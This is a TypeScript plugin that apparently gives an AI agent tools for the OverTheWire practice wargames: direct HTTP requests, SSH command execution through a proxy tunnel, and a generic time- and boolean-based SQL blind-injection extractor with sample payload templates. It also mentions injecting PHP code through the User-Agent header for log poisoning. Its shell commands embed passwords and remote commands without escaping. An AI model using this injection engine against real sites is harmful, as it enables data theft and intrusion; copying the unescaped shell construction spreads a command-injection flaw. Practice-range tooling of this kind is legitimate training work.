/**
 * dsh-cyber-range：OverTheWire 在线靶场攻坚工具集
 *
 * 把 CTF 攻坚中反复手写的临时脚本能力资产化为可复用工具（主人定调：临时脚本无资产属性、无法迭代提升）：
 *  - otw_request：OverTheWire HTTP 直连请求（Basic auth + Host header，绕过代理直连）
 *  - otw_ssh：OverTheWire SSH 命令执行（clash 代理 CONNECT 隧道）
 *  - otw_blind：通用 SQL 盲注引擎（布尔/时间、ASCII 二分、LIKE 前缀，抗网络抖动）
 *
 * 设计原则：工具通用化（不是单关脚本），参数化可复用；输出结构化 + 人类可读 render。
 */
import type { Context } from '@deepseek-ai/cordis'
import z from '@deepseek-ai/schemastery'
import { defineTool } from '@deepseek-ai/dsh-tools'
import { request as httpRequest, type IncomingMessage } from 'node:http'
import { spawn } from 'node:child_process'

export const name = 'cyber-range'
export const inject = ['tools'] as const

export interface Config {
  enabled: boolean
  /** 默认直连 IP 解析（如 natas 服务器 51.20.162.29），缺省用系统 DNS */
  defaultResolveIp?: string
  /** SSH 隧道代理 */
  proxyHost?: string
  proxyPort?: number
}
export const Config = z.object({
  enabled: z.boolean().default(true),
  defaultResolveIp: z.string().required(false),
  proxyHost: z.string().default('127.0.0.1'),
  proxyPort: z.number().default(16888),
})

// ════════════════════════ HTTP 直连请求（otw_request） ════════════════════════

/** 底层 HTTP 请求：绕过代理环境变量直连（系统 DNS 或 resolveIp），带 Host header 与 Basic auth */
function rawHttp(opts: {
  hostname: string
  port: number
  path: string
  method: string
  headers: Record<string, string>
  body?: string
  timeoutMs?: number
}): Promise<{ status: number; headers: Record<string, string | string[] | undefined>; body: string }> {
  return new Promise((resolve, reject) => {
    const req = httpRequest(
      {
        hostname: opts.hostname,
        port: opts.port,
        path: opts.path,
        method: opts.method,
        headers: opts.headers,
        timeout: opts.timeoutMs ?? 20000,
      },
      (res: IncomingMessage) => {
        const chunks: Buffer[] = []
        res.on('data', (c: Buffer) => chunks.push(c))
        res.on('end', () => {
          const body = Buffer.concat(chunks).toString('utf8')
          resolve({ status: res.statusCode ?? 0, headers: res.headers, body })
        })
      },
    )
    req.on('timeout', () => { req.destroy(new Error('timeout')) })
    req.on('error', (e: Error) => reject(e))
    if (opts.body) req.write(opts.body)
    req.end()
  })
}

// ════════════════════════ WSL 子进程执行（otw_ssh / otw_request 共用） ════════════════════════

/** 经 wsl.exe 执行 bash 命令（复用 WSL 工具链与网络通道；web 进程自身网络受限，WSL 子进程不受限） */
function spawnWsl(cmd: string, timeoutMs: number): Promise<{ ok: boolean; stdout: string; stderr: string; exitCode: number }> {
  return new Promise((resolve) => {
    const child = spawn('wsl.exe', ['-d', 'Ubuntu', '--', 'bash', '-c', cmd], { timeout: timeoutMs })
    let stdout = ''
    let stderr = ''
    child.stdout.on('data', (d: Buffer) => { stdout += d.toString() })
    child.stderr.on('data', (d: Buffer) => { stderr += d.toString() })
    child.on('close', (code) => resolve({ ok: code === 0, stdout, stderr, exitCode: code ?? -1 }))
    child.on('error', (e: Error) => resolve({ ok: false, stdout, stderr: stderr + '\n' + e.message, exitCode: -1 }))
  })
}

// ════════════════════════ SSH 命令执行（otw_ssh） ════════════════════════

/** 经 WSL（复用 sshpass/ssh/nc）+ clash 代理 CONNECT 隧道执行 SSH 命令（OverTheWire SSH 直连被墙时的标准通道） */
function sshExec(opts: {
  host: string
  port: number
  user: string
  pass: string
  command: string
  proxyHost: string
  proxyPort: number
  timeoutMs?: number
}): Promise<{ ok: boolean; stdout: string; stderr: string; exitCode: number }> {
  const proxyCmd = `nc -X connect -x ${opts.proxyHost}:${opts.proxyPort} %h %p`
  const sshCmd = `sshpass -p '${opts.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=15 -o ProxyCommand='${proxyCmd}' ${opts.user}@${opts.host} -p ${opts.port} '${opts.command}'`
  return spawnWsl(sshCmd, opts.timeoutMs ?? 60000)
}

// ════════════════════════ SQL 盲注引擎（otw_blind） ════════════════════════

/** 发送一次盲注判定请求，返回响应耗时（时间盲注）与响应文本（布尔盲注） */
async function blindProbe(
  url: URL,
  method: string,
  data: string,
  injectParam: string,
  injectValue: string,
  headers: Record<string, string>,
): Promise<{ dtMs: number; body: string }> {
  const t0 = Date.now()
  const payload = new URLSearchParams()
  if (method === 'POST') {
    for (const pair of data.split('&')) {
      const [k, ...rest] = pair.split('=')
      if (k) payload.append(decodeURIComponent(k), decodeURIComponent(rest.join('=')))
    }
    payload.set(injectParam, injectValue)
    const body = payload.toString()
    const res = await rawHttp({
      hostname: url.hostname, port: Number(url.port || 80), path: url.pathname + url.search,
      method: 'POST', headers: { ...headers, 'Content-Type': 'application/x-www-form-urlencoded' }, body,
    })
    return { dtMs: Date.now() - t0, body: res.body }
  }
  // GET
  const sp = new URLSearchParams(url.search)
  sp.set(injectParam, injectValue)
  const path = url.pathname + '?' + sp.toString()
  const res = await rawHttp({
    hostname: url.hostname, port: Number(url.port || 80), path,
    method: 'GET', headers,
  })
  return { dtMs: Date.now() - t0, body: res.body }
}

/**
 * 通用 SQL 盲注：按注入模板（{COND} 占位）+ 条件构造（ascii_gt / ascii_eq / like_prefix）二分提取目标字符串。
 * mode=time：SLEEP 秒判定（>sleepThreshold 为真）；mode=bool：响应含 trueText 为真。
 * 抗网络抖动：每次判定 3 次取中位数。
 */
async function blindExtract(opts: {
  url: string
  method?: string
  data?: string
  injectParam: string
  template: string          // 注入值模板，{COND} 被替换为条件 SQL，如 natas18" AND IF({COND}, SLEEP(2), 1) -- 
  condType: 'ascii_gt' | 'ascii_eq' | 'like_prefix'
  expr: string              // 要提取的 SQL 表达式，如 password
  mode: 'time' | 'bool'
  sleepSec?: number
  sleepThresholdMs?: number
  trueText?: string
  maxLen?: number
  charset?: string          // 'alnum' | 'printable' | 自定义
}): Promise<{ result: string; queries: number; error?: string }> {
  const method = opts.method ?? 'POST'
  const data = opts.data ?? ''
  const maxLen = opts.maxLen ?? 40
  const sleepSec = opts.sleepSec ?? 2
  const sleepThresholdMs = opts.sleepThresholdMs ?? Math.max(1200, sleepSec * 1000 * 0.6)
  const charset = opts.charset ?? 'alnum'

  const buildCharset = (): string[] => {
    if (charset === 'printable') return Array.from({ length: 95 }, (_, i) => String.fromCharCode(32 + i))
    if (charset === 'alnum') return '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'.split('')
    return charset.split('')
  }
  const cs = buildCharset().sort()
  const codes = cs.map((c) => c.charCodeAt(0))
  const csMin = codes.length > 0 ? Math.min(...codes) : 32
  const csMax = codes.length > 0 ? Math.max(...codes) : 126

  const url = new URL(opts.url)
  const headers: Record<string, string> = { Host: url.hostname }
  if (url.username) headers.Authorization = 'Basic ' + Buffer.from(decodeURIComponent(url.username) + ':' + decodeURIComponent(url.password)).toString('base64')
  // 去掉 url 里的 user:pass（保留 host）
  url.username = ''
  url.password = ''

  let queries = 0
  const probe = async (cond: string): Promise<boolean> => {
    const injectValue = opts.template.replace('{COND}', cond)
    // 3 次测量取中位数（抗网络抖动）
    const samples: number[] = []
    const bodies: string[] = []
    for (let i = 0; i < 3; i++) {
      const r = await blindProbe(url, method, data, opts.injectParam, injectValue, headers)
      samples.push(r.dtMs)
      bodies.push(r.body)
      queries++
    }
    samples.sort((a, b) => a - b)
    if (opts.mode === 'time') return (samples[1] ?? 0) > sleepThresholdMs
    const trueText = opts.trueText ?? ''
    // bool 模式：多数样本含 trueText 判定为真
    const hits = bodies.filter((b) => b.includes(trueText)).length
    return hits >= 2
  }

  const cond = (pos: number, asc: number): string => {
    if (opts.condType === 'ascii_gt') return `ASCII(SUBSTRING(${opts.expr},${pos},1)) > ${asc}`
    if (opts.condType === 'ascii_eq') return `ASCII(SUBSTRING(${opts.expr},${pos},1)) = ${asc}`
    // like_prefix：用 char 范围二分（LIKE 通配符陷阱：% _ 需转义或用 ascii 比较）
    return `ASCII(SUBSTRING(${opts.expr},${pos},1)) > ${asc}`
  }

  let result = ''
  try {
    for (let pos = 1; pos <= maxLen; pos++) {
      // ASCII 二分（在字符集范围内）
      let lo = csMin - 1
      let hi = csMax + 1
      while (lo + 1 < hi) {
        const mid = Math.floor((lo + hi) / 2)
        if (await probe(cond(pos, mid))) lo = mid
        else hi = mid
      }
      if (hi < csMin || hi > csMax) break
      const c = String.fromCharCode(hi)
      if (!cs.includes(c)) break
      result += c
    }
  } catch (e) {
    return { result, queries, error: e instanceof Error ? e.message : String(e) }
  }
  return { result, queries }
}

// ════════════════════════ 插件挂载 ════════════════════════

export function apply(ctx: Context, config: Config): void {
  ctx.tools.register(defineTool({
    name: 'otw_request',
    description: 'OverTheWire HTTP 直连请求（Basic auth + Host header，绕过代理环境变量直连）。用于 Natas 等 Web 关卡：GET/POST、携带 cookie、返回状态码与 body。直连比走代理快（Natas 实测 0.6s vs 1.5s+）。',
    parameters: {
      host: { type: 'string', description: '目标 host（如 natas20.natas.labs.overthewire.org）', required: true },
      user: { type: 'string', description: 'Basic auth 用户名（如 natas20）' },
      pass: { type: 'string', description: 'Basic auth 密码' },
      path: { type: 'string', description: '路径（默认 /）' },
      method: { type: 'string', description: 'GET/POST（默认 GET）' },
      data: { type: 'string', description: 'POST 表单数据（如 username=admin&password=x，将 URL 编码）' },
      cookie: { type: 'string', description: 'Cookie 头（如 PHPSESSID=xxx）' },
      userAgent: { type: 'string', description: '自定义 User-Agent 头（缺省 curl/7.x；日志投毒类攻击可注入 PHP 代码）' },
      resolveIp: { type: 'string', description: '直连 IP（缺省用系统 DNS；WSL DNS 坏时传 51.20.162.29）' },
      maxBodyChars: { type: 'number', description: 'body 返回截断上限（默认 12000）' },
    },
    output: {
      schema: { type: 'object', additionalProperties: false, properties: { status: { type: 'number', required: true }, body: { type: 'string' }, truncated: { type: 'boolean' }, error: { type: 'string' } } },
      render: (_a: unknown, v: any) => [{ type: 'text', text: 'HTTP ' + v.status + (v.error ? ' ERROR: ' + v.error : '') + '\n' + (v.body ?? '') + (v.truncated ? '\n…(截断)' : '') }],
    },
    async execute(args: { host: string; user?: string; pass?: string; path?: string; method?: string; data?: string; cookie?: string; userAgent?: string; resolveIp?: string; maxBodyChars?: number }) {
      try {
        const method = (args.method ?? 'GET').toUpperCase()
        const path = args.path ?? '/'
        const resolveFlag = args.resolveIp ? `--resolve ${args.host}:80:${args.resolveIp} ` : ''
        const authFlag = args.user ? `-u '${args.user}:${args.pass ?? ''}' ` : ''
        const cookieFlag = args.cookie ? `-b '${args.cookie}' ` : ''
        const uaFlag = args.userAgent ? `-A '${args.userAgent.replace(/'/g, "'\\''")}' ` : ''
        const dataFlag = method === 'POST' && args.data ? `-d '${args.data.replace(/'/g, "'\\''")}' ` : ''
        const curlCmd = `curl -s --noproxy "*" --max-time 20 ${resolveFlag}${authFlag}${cookieFlag}${uaFlag}${dataFlag}-w '\\n%{http_code}' 'http://${args.host}${path}'`
        // 经 WSL 执行（web 进程网络受限，WSL 复用完整工具链+网络通道）
        const out = await spawnWsl(curlCmd, 30000)
        if (!out.ok) return { status: 0, body: '', truncated: false, error: out.stderr.slice(0, 500) }
        // 最后一行是 http_code，其余是 body
        const lines = out.stdout.split('\n')
        const codeStr = lines.length > 1 ? (lines[lines.length - 1] ?? '').trim() : ''
        const status = Number(codeStr) || 0
        const body = lines.length > 1 ? lines.slice(0, -1).join('\n') : out.stdout
        const maxChars = args.maxBodyChars ?? 12000
        const truncated = body.length > maxChars
        return { status, body: truncated ? body.slice(0, maxChars) : body, truncated }
      } catch (e) {
        return { status: 0, body: '', truncated: false, error: e instanceof Error ? e.message : String(e) }
      }
    },
  }))

  ctx.tools.register(defineTool({
    name: 'otw_ssh',
    description: 'OverTheWire SSH 命令执行（clash 代理 CONNECT 隧道，直连被墙时的标准通道）。用于 Bandit/Leviathan 等 SSH 关卡：执行远程命令返回输出。',
    parameters: {
      host: { type: 'string', description: 'SSH 主机（如 bandit.labs.overthewire.org）', required: true },
      port: { type: 'number', description: '端口（默认 2220）' },
      user: { type: 'string', description: '用户名', required: true },
      pass: { type: 'string', description: '密码', required: true },
      command: { type: 'string', description: '要执行的远程命令', required: true },
    },
    output: {
      schema: { type: 'object', additionalProperties: false, properties: { ok: { type: 'boolean', required: true }, stdout: { type: 'string' }, stderr: { type: 'string' }, exitCode: { type: 'number' } } },
      render: (_a: unknown, v: any) => [{ type: 'text', text: (v.ok ? '' : 'SSH 失败: ' + (v.stderr ?? '') + '\n') + (v.stdout ?? '') }],
    },
    async execute(args: { host: string; port?: number; user: string; pass: string; command: string }) {
      return await sshExec({
        host: args.host, port: args.port ?? 2220, user: args.user, pass: args.pass, command: args.command,
        proxyHost: config.proxyHost ?? '127.0.0.1', proxyPort: config.proxyPort ?? 16888,
      })
    },
  }))

  ctx.tools.register(defineTool({
    name: 'otw_blind',
    description: '通用 SQL 盲注引擎：按注入模板（{COND} 占位）+ 条件（ascii_gt/ascii_eq）二分提取目标字符串。mode=time（SLEEP 判定，3 次中位数抗网络抖动）或 mode=bool（响应含 trueText 判定）。规避 LIKE 通配符陷阱（用 ASCII(SUBSTRING) 精确比较）。',
    parameters: {
      url: { type: 'string', description: '目标 URL（含 user:pass 会自动转 Basic auth）', required: true },
      method: { type: 'string', description: 'POST/GET（默认 POST）' },
      data: { type: 'string', description: 'POST 固定参数（如 username=xxx）' },
      injectParam: { type: 'string', description: '注入参数名（如 username）', required: true },
      template: { type: 'string', description: '注入值模板，{COND} 替换为条件 SQL（如 natas18" AND IF({COND}, SLEEP(2), 1) -- ）', required: true },
      condType: { type: 'string', description: 'ascii_gt（默认，二分）/ ascii_eq（线性）' },
      expr: { type: 'string', description: '要提取的 SQL 表达式（如 password）', required: true },
      mode: { type: 'string', description: 'time（SLEEP 判定）/ bool（trueText 判定），默认 time' },
      sleepSec: { type: 'number', description: 'SLEEP 秒数（默认 2）' },
      trueText: { type: 'string', description: 'bool 模式判定为真的响应文本' },
      maxLen: { type: 'number', description: '最大提取长度（默认 40）' },
      charset: { type: 'string', description: 'alnum（默认）/ printable / 自定义字符串' },
    },
    output: {
      schema: { type: 'object', additionalProperties: false, properties: { result: { type: 'string', required: true }, queries: { type: 'number' }, error: { type: 'string' } } },
      render: (_a: unknown, v: any) => [{ type: 'text', text: '盲注结果: ' + (v.result || '（空）') + (v.error ? '\nERROR: ' + v.error : '') + '\n查询数: ' + String(v.queries ?? 0) }],
    },
    async execute(args: { url: string; method?: string; data?: string; injectParam: string; template: string; condType?: string; expr: string; mode?: string; sleepSec?: number; trueText?: string; maxLen?: number; charset?: string }) {
      return await blindExtract({
        url: args.url, method: args.method, data: args.data, injectParam: args.injectParam, template: args.template,
        condType: (args.condType as 'ascii_gt' | 'ascii_eq' | 'like_prefix') ?? 'ascii_gt',
        expr: args.expr, mode: (args.mode as 'time' | 'bool') ?? 'time',
        sleepSec: args.sleepSec, trueText: args.trueText, maxLen: args.maxLen, charset: args.charset,
      })
    },
  }))

  ;(ctx as any).on('ready', () => {
    ctx.logger('dsh-cyber-range').info('ready: otw_request / otw_ssh / otw_blind')
  })
}
